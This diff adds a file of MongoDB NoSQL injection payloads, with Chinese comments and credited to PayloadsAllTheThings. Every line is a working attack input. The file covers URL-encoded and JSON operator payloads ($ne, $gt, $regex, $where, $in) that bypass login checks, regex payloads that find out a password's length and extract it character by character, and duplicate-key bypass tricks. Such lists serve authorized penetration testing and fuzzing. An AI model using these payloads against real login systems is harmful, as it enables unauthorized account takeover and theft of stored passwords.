@@ -1,0 +1,68 @@
+# NoSQL Injection Authentication Bypass Payloads
+# 来源: PayloadsAllTheThings NoSQL Injection
+# MongoDB认证绕过payload集合
+
+# === HTTP Data (URL编码) ===
+username[$ne]=toto&password[$ne]=toto
+username[$ne]=&password[$ne]=
+username[$gt]=&password[$gt]=
+username[$regex]=.*&password[$regex]=.*
+username[$regex]=^&password[$regex]=^
+login[$regex]=a.*&pass[$ne]=lol
+login[$gt]=admin&login[$lt]=test&pass[$ne]=1
+login[$nin][]=admin&login[$nin][]=test&pass[$ne]=toto
+username[$ne]=admin&password[$ne]=admin
+username[$gt]=admin&password[$gt]=
+username[$regex]=admin&password[$ne]=
+user[$ne]=x&pass[$ne]=y
+user[$gt]=&pass[$gt]=
+user[$regex]=.*&pass[$regex]=.*
+admin[$gt]=&admin[$lt]=z&password[$ne]=
+username[$exists]=true&password[$exists]=true
+
+# === JSON Data ===
+{"username": {"$ne": null}, "password": {"$ne": null}}
+{"username": {"$ne": ""}, "password": {"$ne": ""}}
+{"username": {"$ne": "foo"}, "password": {"$ne": "bar"}}
+{"username": {"$gt": undefined}, "password": {"$gt": undefined}}
+{"username": {"$gt": ""}, "password": {"$gt": ""}}
+{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}
+{"username": {"$regex": "^"}, "password": {"$regex": "^"}}
+{"username": {"$regex": "^admin"}, "password": {"$ne": ""}}
+{"username": {"$eq": "admin"}, "password": {"$ne": ""}}
+{"username": {"$in": ["admin", "Admin", "root", "administrator"]}, "password": {"$gt": ""}}
+{"username": {"$exists": true}, "password": {"$exists": true}}
+{"$or": [{"username": "admin"}, {"username": "root"}], "password": {"$ne": ""}}
+{"$where": "this.username == 'admin'"}
+{"$where": "1==1"}
+{"username": "admin", "password": {"$gt": ""}}
+{"username": "admin", "password": {"$ne": "wrongpassword"}}
+
+# === 长度提取 ===
+username[$ne]=toto&password[$regex]=.{1}
+username[$ne]=toto&password[$regex]=.{2}
+username[$ne]=toto&password[$regex]=.{3}
+username[$ne]=toto&password[$regex]=.{4}
+username[$ne]=toto&password[$regex]=.{5}
+username[$ne]=toto&password[$regex]=.{6}
+username[$ne]=toto&password[$regex]=.{7}
+username[$ne]=toto&password[$regex]=.{8}
+
+# === 数据提取 ===
+username[$ne]=toto&password[$regex]=^a
+username[$ne]=toto&password[$regex]=^b
+username[$ne]=toto&password[$regex]=^c
+username[$ne]=toto&password[$regex]=^a.*
+username[$ne]=toto&password[$regex]=^ab.*
+username[$ne]=toto&password[$regex]=^abc.*
+{"username": {"$eq": "admin"}, "password": {"$regex": "^a"}}
+{"username": {"$eq": "admin"}, "password": {"$regex": "^ab"}}
+{"username": {"$eq": "admin"}, "password": {"$regex": "^abc"}}
+
+# === $in 操作符 ===
+{"username":{"$in":["Admin", "4dm1n", "admin", "root", "administrator"]},"password":{"$gt":""}}
+{"username":{"$in":["admin"]},"password":{"$in":["password","123456","admin"]}}
+
+# === 重复键绕过 ===
+{"id":"10", "id":"100"}
+{"username":"admin", "username":{"$ne":""}, "password":{"$ne":""}}
